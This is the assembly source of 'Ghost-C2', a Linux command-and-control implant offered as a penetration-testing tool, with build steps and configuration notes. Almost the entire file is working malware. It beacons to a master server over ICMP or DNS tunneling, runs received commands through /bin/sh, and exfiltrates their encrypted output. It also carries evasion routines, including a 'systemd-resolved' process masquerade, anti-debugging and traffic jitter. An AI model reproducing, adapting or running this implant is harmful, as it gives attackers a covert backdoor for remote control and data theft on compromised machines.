DEFAULT REL
BITS 64
; ===================================================================================
;  ________  ___  ___  ________  ________  _________       ________  ________   
; |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\    |\   ____\|\_____  \  
; \ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|    \ \  \___|\|____|\  \ 
;  \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \      \ \  \     ____\_\  \ 
;   \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \      \ \  \___|\____ \  \ 
;    \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\      \ \______\\_________\
;     \|_______|\|__|\|__|\|_______|\_________\   \|__|       \|______\|_________|
;                                  \|_________|                                   
; ===================================================================================
; Project      : Ghost-C2 (v3.6.2) - "The Hybrid Phantom (Dual-Channel PIC Agent)"
; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
; Architecture : x86_64 Linux (Pure Assembly, Libc-free, 100% PIC)
; -----------------------------------------------------------------------------------
; Features:
;   - Architecture : Fully Position Independent Code (RIP-Relative) for memory injection.
;   - Hybrid Transport: Dual-Channel (ICMP Stealth & DNS UDP Tunneling).
;   - Pivot Logic  : Protocol Hot-Swapping via VTable (!D for DNS / !I for ICMP).
;   - ICMP Module  : Asymmetric ID+SEQ Auth (45k/55k Sum Check).
;   - DNS Module   : Transaction ID Integrity (High + Low = 0xFF Confirmation).
;   - Execution    : Fileless via memfd_create (Runtime argv building & masquerade).
;   - Security     : Rolling XOR Encryption & Safe Stack Mapping (Buffer Isolation).
;   - Evasion      : Adaptive Jitter (Nanosleep) and RDTSC Timestamp Mimicry.
;   - Compression  : dpcm-rle-hybrid-x64-compressor.
; -----------------------------------------------------------------------------------
; License: GNU Affero General Public License v3.0 (AGPL-3.0)
; Versions 3.6.0 and below are MIT. 3.6.1+ is AGPL-3.0.
; Disclaimer: This tool is developed for educational and authorized penetration 
; testing purposes only. The author is not responsible for any misuse.
; -----------------------------------------------------------------------------------
; Build (Raw Binary) : nasm -f bin sniff_pic.asm -o shellcode.bin
; Build (Hex Format) : python3 -c "print(open('shellcode.bin','rb').read().hex())"
; Build (C-Array)    : xxd -i shellcode.bin
;
; Note: The pre-compiled shellcode is already embedded inside the Phantom Loader. 
; You only need to build if you modify the Agent's PIC source logic.
; ===================================================================================

section .text

global _start



; --- ENTRY POINT & DAEMONIZATION ---

_start:

    ;call _htop_masquerade
    ;call _disable_memory_dump
	;call _anti_debugging
    ;mov rax,[fake_name]
    ;mov rdi,[rsp+8]
    ;mov [rdi],rax
    ;mov rax,[fake_name_1]
    ;mov [rdi+8],rax
    ;xor rax, rax              ; rax'i tamamen sıfırla
    ;mov [rdi + 16], rax       ; 16. bayttan itibaren 8 baytı (16-24) komple NULL yap!
    ; Step 1: Fork to background
    mov rax, 57                 ; sys_fork
    syscall
    cmp rax, 0                  
    jne _hang_host                   ; Parent exits

    sub rsp, 0x600000 ; FOR LOADER ! HOLLOW INJECTION UPDATE

    and rsp, -16

    mov rbp, rsp ; anchor
    
    ; ================================================================
    ; 🧠 YENİ: AĞ YÖNLENDİRİCİSİ (VTABLE) KURULUMU
    ; ================================================================
    ; Ajanı ICMP modunda başlatıyoruz. (PIC uyumlu olması için 'rel' kullanıyoruz)
    
    lea rax, [rel _icmp_init]
    mov [rbp + 0x3000], rax       ; Ağ Başlatma Fonksiyonu

    lea rax, [rel _icmp_recv]
    mov [rbp + 0x3008], rax       ; Veri Dinleme Fonksiyonu

    lea rax, [rel _icmp_send]
    mov [rbp + 0x3010], rax       ; Veri Gönderme Fonksiyonu
    ; ================================================================
    
    
    ; Stack'te kendimize güvenli R-W alanlar belirliyoruz:
    ; icmp_packet kopyası -> [rsp + 0x1000]
    ; delay_req kopyası   -> [rsp + 0x1100]
    ; argv_array kopyası  -> [rsp + 0x1200]
    ; icmp_packet'i Stack'e taşı
    lea rsi, [rel icmp_packet]  ; .data'daki orijinal şablon (Sadece okunur, sorun yok)
    lea rdi, [rbp + 0x100]     ; Stack'teki yeni yerimiz (Okunur ve Yazılır!)
    mov rcx, 88                 ; Paketin boyutu
    rep movsb
    ; delay_req'i Stack'e taşı
    lea rsi, [rel delay_req]
    lea rdi, [rbp + 0x1100]
    mov rcx, 32                 ; 4 adet 8 baytlık qword (req ve rem)
    rep movsb
    ; Step 2: Create a new session
    mov rax, 112                ; sys_setsid
    syscall
	; Step 3: Ağ Modülünü Başlat (Hangi protokol VTable'da ise o çalışır)
    call [rbp + 0x3000]
    
    ; --- İLK BEACON (MERHABA PAKETİ) ---
    mov r12, 0              ; Payload boyutu 0 olsun (Boş paket)
    call [rbp + 0x3010]     ; VTable Index 2: _send çağır! (Master'a sinyal gider)
    ; -----------------------------------
    
_sniff:
	call [rbp + 0x3008]     ; VTable'dan Dinleme Fonksiyonunu Çağır (ICMP veya DNS)
    test rax, rax           ; RAX 0 döndüyse paket geçersizdir
    jz _sniff               ; Geçersizse tekrar dinlemeye dön
    
    ; --- DECRYPTION & OFFSET HANDLING ---
    mov r14, rax                    ; RAX'ta payload boyutu var
    lea rsi, [rbp + 0x2000 + 52]    ; Veri adresini al
    mov rcx, r14
    call _xor_cipher                ; şifreyi çöz
    
    ; --- AJAN PIVOT KONTROLÜ --
    cmp byte [rsi], '!'   ; Komut '!' ile mi başlıyor? (Özel komut işareti)
    jne _execute_command  ; Değilse normal shell komutudur, devam et.
    
    ; Eğer '!' ise pivot kontrolü yap
    cmp byte [rsi + 1], 'D' ; !D (DNS'e geç anlamında basit bir check)
    je _switch_to_dns
    
    cmp byte [rsi +1], 'I'
    je _switch_to_icmp
    
    ; --- [MIMICRY UPDATE] DECRYPTION & OFFSET HANDLING ---
    mov [rbp + 0x1200 + 16], rsi
	mov rdx, r14                     
    push rdx                        ; Yazdırma / döngü işlemleri için boyut koruması
    push rsi                        

    jmp _execute_command            ; Execve'ye jmpla
_wait_for_child:
    mov rax, 61                     ; sys_wait4
    mov rsi, 0                      
    mov rdx, 0                      
    mov r10, 0                      
    syscall
    ret
_error:
    mov rax, 60                     ; sys_exit
    mov rdi, 1                      
    syscall
; --- CORE EXECUTION LOGIC ---
_execute_command:
    call _memfd_create              ; Create anonymous RAM file for output capture
    push rax                        ; Save memfd FD
	push rbx
    mov rax, 50
    add rax, 7                     ; sys_fork
    syscall
    cmp rax, 0               
    je _execve                      ; Child process handles execution
    mov rdi, rax            
    call _wait_for_child            ; Parent waits for command to complete
	pop rbx
    pop rdi                         ; Retrieve memfd FD
    call _lseek                     ; Reset file pointer to offset 0
    ; READ LOOP: Capture command output from memfd
    xor r14, r14                    ; Reset bytes read counter
_read_loop:
    mov rax, 0                      ; sys_read
    lea rsi, [rbp + 0x4000 + r14]  
    mov rdx, 1000                   ; Read in 1000-byte chunks
    syscall
    test rax, rax                   ; EOF or no data
    jz _read_done                   
    add r14, rax                    ; Update total count
    cmp r14, 5242880                  ; Check buffer limit
    jl _read_loop                   
_read_done:
    ; --- ENCRYPTION PHASE ---
    ;lea rsi, [full_response]
    ;mov rcx, r14                    
    ;call _xor_cipher                
    mov rax, 3                      ; sys_close (Close memfd)
    syscall
    ; --- COMPRESSION CALL ---
    lea rsi, [rbp + 0x4000]     ; SOURCE: Raw output
    lea rdi, [rbp + 0x100000]   ; DEST: Compressed buffer
    mov rcx, r14                ; RCX = Ham Boyut
    call _vesqer_compress       ; Fonksiyon call
    mov r14, rax                ; YENİ BOYUTU R14'e GÜNCELLE
    mov r15, 0                      ; Reset chunk offset
    jmp _chunk_loop                 ; Proceed to packet fragmentation
_chunk_loop:
    cmp r14, 0
    jle .check_last_chunk           
    ; FRAGMENTATION: Split output into 56-byte chunks
    cmp r14, 56           
    jg .set_max_chunk               
    mov r12, r14            
    jmp .copy_data
.set_max_chunk:
    mov r12, 56
.copy_data:
    cld
    lea rdi, [rbp + 0x100 + 32]     ; Write data after 8 (Header) + 24 (Mimicry)
    xor al, al                      
    mov rcx, 56                   
    rep stosb                       
    ; Update dynamic timestamp for stealth
    rdtsc                           
    mov [rbp + 0x100 + 8], rax
    
    
    
    lea rsi, [rbp + 0x100000 + r15]
    lea rdi, [rbp + 0x100 + 32]     ; Copy actual encrypted chunk
    mov rcx, r12
    rep movsb       
                    
    lea rsi, [rbp + 0x100 + 32]
    mov rcx, r12
    call _xor_cipher
.packet_send:
    call [rbp + 0x3010]

    sub r14, r12                    ; Decrease remaining bytes
    add r15, r12                    ; Advance read offset
    jmp _chunk_loop                 
.check_last_chunk:
    ; Check if an EOF packet is needed
    cmp r12,56                    
    jne _sniff                      
    ; Send 1-byte EOF packet
    mov r12, 1                      
    xor r14, r14                    
    cld
    lea rdi, [rbp + 0x100 + 32]
    xor al, al
    mov rcx, 56
    rep stosb                       
    rdtsc
    mov [rbp + 0x100 + 8], rax
	call [rbp + 0x3010]
    jmp _sniff                      
_execve:
    ; Redirection: Bind stdout/stderr to memfd
    pop rbx
    pop rdi                         ; Retrieve memfd FD from stack
    call _dup2                      
	lea rax, [rel str_sh]
	mov [rbp + 0x1200], rax ; rbp+1200 -> "/bin/sh"
	lea rax, [rel str_flag]
	mov [rbp + 0x1208], rax ; rbp+1208 -> "-c"
	lea rax, [rbp + 0x2000 + 52]
	mov [rbp + 0x1210], rax
	xor rax, rax
	mov [rbp + 0x1218], rax
    ; Execute shell command
    mov rax, 50
    add rax, 9                     ; sys_execve
    lea rdi, [rel str_sh]                
    lea rsi, [rbp + 0x1200]            
    xor rdx, rdx                      
    syscall
_dup2:
    mov rax, 33                     ; sys_dup2 (STDOUT)
    mov rsi, 1                      
    syscall
    mov rax, 33                     ; sys_dup2 (STDERR)
    mov rsi, 2                      
    syscall
    ret
_lseek:
    mov rax, 8                      ; sys_lseek
    mov rsi, 0                      
    mov rdx, 0                      
    syscall
    ret
_memfd_create:
	mov rax, 300
    add rax, 19                    ; sys_memfd_create
    lea rdi, [rel dir]                    
    mov rsi, 0                      
    syscall
    ret
_xor_cipher:
    test rcx, rcx                   
    jz .done                        
    push rsi                        
    push rdx                        ; DL kullanacağımız için RDX'i koruyalım
    mov dl, 0x42                    ; Başlangıç anahtarı (Seed)
.loop:
    xor byte [rsi], dl              ; Baytı mevcut anahtarla XOR'la
    add dl, 0x07                    ; Her adımda anahtarı 7 artır (Rolling etkisi)
    inc rsi                         
    loop .loop                      
    pop rdx                         
    pop rsi                         
.done:
    ret

_htop_masquerade:
    mov rax,157
    mov rdi,15
    lea rsi, [fake_name]
    syscall
    ret
_disable_memory_dump:
    mov rax,157
    mov rdi,4
    mov rsi, 0
    syscall
    ret
_anti_debugging:
	mov rax, 91
	add rax, 10 ; sys_ptrace
	xor rdi,rdi ; PTRACE_TRACEME (0)
	xor rsi,rsi
	xor rdx,rdx
	xor r10,r10
	syscall
	test rax,rax
	js _exit
	ret



_vesqer_compress:
    push rbx
    push rsi
    push rdi
    push r8
    push r9
    push r11
    
    mov r11, rdi                ; Start pointer for size calc
    test rcx, rcx
    jz .comp_done
    mov r8b, 1                  ; RLE count
    xor r9b, r9b                ; Active Delta
    ; Anchor
    mov al, byte [rsi]
    inc rsi
    mov byte [rdi], al
    inc rdi
    mov bl, al
    dec rcx
    jz .comp_final
    
    mov al, byte [rsi]
    mov dl, al
    sub al, bl
    mov r9b, al
    
    mov bl, dl
    
    inc rsi
    dec rcx
    
.comp_loop:
    test rcx, rcx
    jz .comp_final
    mov al, byte [rsi]
    mov dl, al
    sub al, bl
    cmp al, r9b
    jne .comp_flush
.comp_inc:
    inc r8b
    inc rsi
    dec rcx
    jz .comp_final
    mov bl, dl
    cmp r8b, 255
    jne .comp_loop
.comp_flush_255:
    mov byte [rdi], r8b      ; 255'i yaz
    inc rdi
    mov byte [rdi], r9b      ; Mevcut deltayı yaz
    inc rdi
    
    ; --- [YENİ: SIFIRLAMA MANTIĞI] ---
    mov r8b, 0               ; Sayacı sıfırla (Bir sonraki lodsb 1 yapacak)
    ; Anchor (bl) zaten rsi'daki karakterle aynı, dokunma!
    jmp .comp_loop           ; Hiçbir şeyi atlamadan döngüye dön
.comp_flush:
    mov byte [rdi], r8b
    inc rdi
    mov byte [rdi], r9b
    inc rdi
    mov r9b, al
    mov r8b, 1
    mov bl, dl
    inc rsi
    dec rcx
    jz .comp_final
    jmp .comp_loop
.comp_final:
    mov byte [rdi], r8b
    inc rdi
    mov byte [rdi], r9b
    inc rdi
.comp_done:
    mov rax, rdi
    sub rax, r11                ; RAX = NEW COMPRESSED LENGTH
    pop r11
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbx
    ret
 
_lcg_jitter:
	push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

    rdtsc                           ; EAX = TSC düşük 32 bit
    imul eax, eax, 1664525          ; LCG karıştırma (entropi arttırır)
    add  eax, 1013904223

    xor  edx, edx                   ; div için EDX:EAX hazırla
    mov  ecx, 900000000             ; mod 900M  → [0, 900M)
    div  ecx
    add  edx, 100000000             ; +100M → [100ms, 1000ms)

    ; timespec stack'te: [rbp-16] = tv_sec, [rbp-8] = tv_nsec
    sub  rsp, 32                    ; 2 × timespec (hizalı)
    mov  qword [rsp],    0          ; tv_sec  = 0
    mov  qword [rsp+8],  rdx        ; tv_nsec = hesaplanan değer

    mov  rax, 35                    ; sys_nanosleep
    mov  rdi, rsp                   ; req = &timespec
    xor  rsi, rsi                   ; rem = NULL
    syscall

    add  rsp, 32                    ; stack temizle

	pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret
 
; =================================================================
; GHOST-C2 PROTOCOL MODULE: ICMP
; =================================================================

_icmp_init:
    mov rax, 40
    add rax, 1                  ; sys_socket
    mov rdi, 2                  ; AF_INET
    mov rsi, 3                  ; SOCK_RAW
    mov rdx, 1                  ; IPPROTO_ICMP
    syscall                     
    mov [rbp + 0x10], eax       
    ret

_icmp_send:
    ; --- ICMP'ye ÖZEL ÖN HAZIRLIK ---
	call _create_seq_id         ; Paketin ID ve SEQ numaralarını (Auth) basar
    call _checksum_cal          ; Paketin checksum'ını hesaplar ve mühürler
    ; --- GÖNDERME İŞLEMİ ---
    mov rax, 44                 ; sys_sendto
    mov edi, dword [rbp + 0x10] 
    lea rsi, [rbp + 0x100]      
    lea rdx, [r12 + 32]         ; Header(8) + Mimicry(24) + Payload(r12)
    mov r10, 0               
    lea r8, [rel master_addr]       
    mov r9, 16               
    syscall

    ; --- ICMP'YE ÖZEL JITTER ---
	call _lcg_jitter

; --- ICMP ÖZEL: ID/SEQ Üretimi ---
_create_seq_id:
    rdtsc
    xor edx, edx
    mov ecx, 20000
    div ecx
    add edx, 10000          ; Random ID (10k - 30k)
    mov eax, 55000          ; Auth Key Sum
    sub eax, edx            ; EAX = SEQ
    xchg dl, dh             ; Endianness
    xchg al, ah
    mov word [rbp + 0x100 + 4], dx
    mov word [rbp + 0x100 + 6], ax
    ret

; --- ICMP ÖZEL: Checksum Hesaplama ---
_checksum_cal:
    mov word [rbp + 0x100 + 2], 0          
    xor rcx, rcx                    
    xor r13, r13                    
    xor rax, rax                    
    xor r11d, r11d                  
    mov rcx, 32                     
    add rcx, r12                    
    mov r13, 0                      
    xor rbx, rbx                    
.checksum_loop:
    movzx r11d, word [rbp + 0x100 + r13] 
    add eax, r11d                    
    add r13, 2                      
    sub rcx, 2                      
    cmp rcx, 2                      
    jge .checksum_loop              
    cmp rcx, 1                      
    je .final                       
    jmp .wrap                       
.final:
    movzx r11d, byte [rbp + 0x100 + r13] 
    add eax, r11d                  
.wrap:
    mov ebx, eax                    
    shr ebx, 16                     
    and eax, 0xFFFF                 
    add ax, bx                      
    adc ax, 0                       
    not ax                          
    mov word[rbp + 0x100 + 2], ax               
    ret
_icmp_recv:
    ; 1. Receive Buffer Cleaning (rbp + 0x2000)
    lea rdi, [rbp + 0x2000]
    xor al, al
    mov rcx, 1200
    rep stosb

    ; 2. sys_recvfrom
    mov dword [rbp + 0x14], 16       ; addr_len
    mov rax, 45                      ; sys_recvfrom
    mov edi, dword [rbp + 0x10]      ; FD
    lea rsi, [rbp + 0x2000]          ; Buffer
    mov rdx, 1200                    ; Max len
    xor r10, r10                     ; Flags = 0
    lea r8, [rbp + 0x20]             ; incoming_addr
    lea r9, [rbp + 0x14]             ; addr_len ptr
    syscall

    ; 3. ICMP confirmation
    test rax, rax                    ; checking for error or no data
    jle .invalid_packet

    ; Size check: IP(20) + ICMP(8) + Mimicry(24) = 52 Byte
    cmp rax, 52
    jb .invalid_packet

    ; Type 8 (Echo Request) kontrolü
    cmp byte [rbp + 0x2000 + 20], 8
    jne .invalid_packet

    ; 4. Asimetrik ID CONFIRMATION (Master Auth: ID + SEQ = 45000)
    movzx ebx, word [rbp + 0x2000 + 26] ; Take Seq
    xchg bl, bh                         ; Endianness fix
    movzx ecx, word [rbp + 0x2000 + 24] ; Take ID
    xchg cl, ch                         ; Endianness fix
    add ebx, ecx                        ; SUM
    cmp ebx, 45000                      ; Does keys equal ?
    jne .invalid_packet
	sub rax, 52
    ret

.invalid_packet:
    xor rax, rax                     ; IF its invlaid packet rax = 0
    ret
    
    

; =================================================================
; GHOST-C2 PROTOCOL MODULE: DNS (AGENT SIDE - PIC COMPLIANT)
; =================================================================
_dns_init:
    mov rax, 41             ; syscall: socket
    mov rdi, 2              ; AF_INET
    mov rsi, 2              ; SOCK_DGRAM
    mov rdx, 17             ; IPPROTO_UDP
    syscall
    test rax, rax
    js _exit                ; Hata varsa sessizce öl
    mov [rbp + 0x10], eax   ; FD'yi Stack Anchor'a güvenle kaydet!
    ret

_dns_send:
    lea rdi, [rbp + 0x500]  ; Ajanın DNS Paket Gönderme Buffer'ı

.retry_rand:
    rdrand eax
    jnc .retry_rand
    mov dl, 0xFF
    sub dl, al
    mov ah, dl
    mov word [rdi], ax
    mov dword [rdi + 2], 0x01000001
    mov dword [rdi + 6], 0
    mov word [rdi + 10], 0

    add rdi, 12                     ; QNAME başlangıcına zıpla

    ; --- R12 (Veri) Kontrolü ---
    test r12, r12                   ; İlk beacon (0 bayt) mı?
    jz .skip_encode                 ; Evetse şifrelemeyi atla!

    ; Payload Kodlama
    lea rsi, [rbp + 0x100 + 32]     ; Şifreli ajan verisinin adresi
    mov rcx, r12                    ; R12'de boyut var
    mov rax, r12
    shl rax, 1                      ; Boyutu 2 ile çarp (Hex uzunluğu)
    mov byte [rdi], al              ; DNS Label uzunluğunu yaz
    add rdi, 1                      ; İleri kay

    call _dns_encode                ; Şifrele (RDI otomatik ilerler)

.skip_encode:
    ; Fake Domain'i kopyala
    lea rsi, [rel fake_domain]      ; REL kullanarak PIC uyumlu kopyalama
.copy_domain:
    lodsb
    stosb
    test al, al
    jnz .copy_domain

    mov dword [rdi], 0x01001000     ; QTYPE ve QCLASS
    add rdi, 4

    ; Dinamik Boyut Hesaplama
    lea r8, [rbp + 0x500]
    mov rdx, rdi
    sub rdx, r8                     ; RDX = Toplam Paket Boyutu

    mov rax, 44                     ; sys_sendto
    mov edi, dword [rbp + 0x10]     ; FD'yi Anchor'dan AL!
    lea rsi, [rbp + 0x500]          ; Gönderilecek Buffer
    mov r10, 0
    lea r8, [rel master_addr]       ; HEDEF İP (Aşağıdan Okuyacak)
    mov r9, 16
    syscall

    call _lcg_jitter
    ret

_dns_recv:
    lea rdi, [rbp + 0x2000]             ; Recv Buffer'ı temizle
    xor al, al
    mov rcx, 1200
    rep stosb

    mov dword [rbp + 0x14], 16
    mov rax, 45                         ; sys_recvfrom
    mov edi, dword [rbp + 0x10]         ; FD'yi Anchor'dan AL!
    lea rsi, [rbp + 0x2000]
    mov rdx, 1200
    xor r10, r10
    lea r8, [rbp + 0x20]
    lea r9, [rbp + 0x14]
    syscall

    cmp rax, 12
    jb .invalid_packet

    movzx ebx, word [rbp + 0x2000]
    add bl, bh
    cmp bl, 0xFF
    jne .invalid_packet

    ; --- DNS DECODER (QNAME İLK ETİKETİ OKU VE ÇEVİR) ---
    lea rsi, [rbp + 0x2000 + 12]        ; QNAME başlangıcı
    lodsb                               ; AL = Hex uzunluğu
    test al, al
    jz .invalid_packet                  
    
    movzx rcx, al
    shr rcx, 1                          ; Gerçek boyut (Hex/2)
    push rcx                            ; RAX için sakla
    
    lea rdi, [rbp + 0x2000 + 300]        ; KÖPRÜ OFSETİ
    
.decode_loop:
    lodsb
    cmp al, '9'
    jbe .is_num1
    sub al, 0x57
    jmp .merge1
.is_num1:
    sub al, 0x30
.merge1:
    shl al, 4
    mov dl, al
    
    lodsb
    cmp al, '9'
    jbe .is_num2
    sub al, 0x57
    jmp .merge2
.is_num2:
    sub al, 0x30
.merge2:
    add al, dl
    stosb
    
    dec rcx
    jnz .decode_loop
    
    pop rax                             ; Orijinal boyutu RAX'a çek
    
    ; --- YENİ KÖPRÜ: İşlem bitince temiz veriyi asıl yerine (52) taşı ---
    push rax
    mov rcx, rax
    lea rsi, [rbp + 0x2000 + 300]
    lea rdi, [rbp + 0x2000 + 52]
    cld
    rep movsb
    pop rax
    ret

.invalid_packet:
    xor rax, rax
    ret

	
_dns_encode:
	test rcx, rcx       ; Veri var mı?
    jz .done
	push r15
	push r14
	push r13
	xor r15, r15
	mov r14d, 0x30
	mov r13d, 0x57
	cld

.next_byte:
	; THIS SECTION FOR ASCII TRANSLATION
	
	lodsb
	mov dl, al					; backup
	shr al, 4
	cmp al, 9
	cmovbe r15d, r14d			; if al less than 9
	cmova r15d, r13d			; if al greater than 9
	add al, r15b					; adding r15 to al
	stosb
	
	mov al, dl					; getting back the backup
	and al, 0x0F
	cmp al, 9
	cmovbe r15d, r14d
	cmova r15d, r13d
	add al, r15b
	stosb

	dec rcx
	jnz .next_byte

	
.done:
	pop r13
	pop r14
	pop r15
	ret

_switch_to_dns:
    ; 1. Eski soketi kapat (Clean Exit)
    mov rax, 3          ; sys_close
    mov edi, dword [rbp + 0x10]
    syscall

    ; 2. VTable'ı DNS adresleriyle OVERWRITE et!
    lea rax, [rel _dns_init]
    mov [rbp + 0x3000], rax
    lea rax, [rel _dns_recv]
    mov [rbp + 0x3008], rax
    lea rax, [rel _dns_send]
    mov [rbp + 0x3010], rax


    ; 3. Yeni protokolü başlat ve dinlemeye dön
    call [rbp + 0x3000]
    
    call _lcg_jitter        ; Master'ın hazırlanması için 1 sn bekle
    mov r12, 0              ; Boş beacon
    call [rbp + 0x3010]     ; _dns_send çağır!
    jmp _sniff

_switch_to_icmp:
    ; 1. Eski soketi kapat (Açık olan DNS UDP soketini öldür)
    mov rax, 3              ; sys_close
    mov edi, dword [rbp + 0x10]
    syscall

    ; 2. VTable'ı ICMP adresleriyle OVERWRITE et!
    lea rax, [rel _icmp_init]
    mov [rbp + 0x3000], rax
    lea rax, [rel _icmp_recv]
    mov [rbp + 0x3008], rax
    lea rax, [rel _icmp_send]
    mov [rbp + 0x3010], rax

    ; 3. Yeni protokolü (ICMP) başlat
    call [rbp + 0x3000]     ; _icmp_init çalışır ve yeni Raw Socket açılır
    
    ; 4. ICMP Beacon atmaz! Direkt pusuya (sniff) yatar.

    jmp _sniff

_exit:
    mov rax, 60                     ; sys_exit
    mov rdi, 0                      
    syscall
_hang_host:
    mov rax, 34         ; sys_pause infinte loop / (Sonsuza kadar bekler)
    syscall
    jmp _hang_host      ; If wake up go sleep it again / Uyanırsa tekrar uyut
; =================================================================

; 🚩 GHOST-C2 VERİ DEPOSU (KODUNUN PARÇASI)

; =================================================================

; ============================================================================
; [!] CRITICAL OPSEC CONFIGURATION [!]
; ============================================================================
; This is the 'sockaddr_in' structure. The Agent uses this to determine WHERE 
; to send the initial beacon and exfiltrated data. 
; YOU MUST MODIFY THESE VALUES TO MATCH YOUR MASTER C2 SERVER BEFORE COMPILING!

master_addr:
    ; sin_family: AF_INET (IPv4 Protocol) - Do not change.
    dw 2                
    
    ; sin_port: The UDP port for DNS Tunneling. 
    ; [WARNING] THIS MUST BE IN NETWORK BYTE ORDER (Big-Endian)!
    ; - Local Testing : Port 5300 (0x14B4 -> reversed to 0xB414) to avoid port conflicts.
    ; - Real Operation: Port 53   (0x0035 -> reversed to 0x3500) for standard DNS bypass.
    dw 0xB414           
    
    ; sin_addr: The IP Address of your Master C2 Server.
    ; Format: Comma-separated decimal values. 
    ; Example: If Master is 192.168.1.15 -> change to: db 192, 168, 1, 15
    db 127, 0, 0, 1     
    
    ; sin_zero: 8 bytes of padding to match the standard socket structure size.
    dq 0                

; ----------------------------------------------------------------------------
; DNS TUNNELING DOMAIN CONFIGURATION
; ----------------------------------------------------------------------------
; This is the decoy domain used in the DNS Question (QNAME) section to bypass
; firewall restrictions and blend in with regular network traffic.
; 
; FORMAT RULE (RFC 1035): [Length], "Label", [Length], "Label", 0 (Null-terminated)
; Example 1: "c2.com"      -> db 2, "c2", 3, "com", 0
; Example 2: "update.net"  -> db 6, "update", 3, "net", 0

fake_domain db 5, "ghost", 3, "com", 0   
; ============================================================================

fake_name    db "systemd-"

fake_name_1  db "resolved", 0



delay_req:

        dq 0                ; Seconds (tv_sec)
        dq 600000000        ; Nano seconds (tv_nsec) - Base 600ms / set to 600 ms or 900 ms at least

delay_rem:

        dq 0                ; Remaining time if interrupted
        dq 0

dir db '[shm]', 0   ; B memfd ismi



    ; --- [MIMICRY UPDATE] UPDATED PACKET ARCHITECTURE ---

icmp_packet:

    type db 0               ; ICMP Type 0 (Echo Reply)
    code db 0               
    checksum dw 0           ; Checksum placeholder

    identifier dw 0    ; Packet Identifier
    sequence dw 0  ; Magic Sequence for filtering
    ; --- MIMICRY PADDING (24 BYTES) ---
    mimicry_ts dq 0         ; 8-byte Dynamic Timestamp (RDTSC)
    mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
                db 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
        ; -------------------------------------
payload times 56 db 0 ; Command output payload (56 bytes chunk)
    payload_len equ $ - payload
newline      db 10
space_char   db 32
forip db 4                  ; Legacy variable
str_sh db '/bin/sh', 0      ; Path to shell
str_flag db '-c', 0         ; Command flag
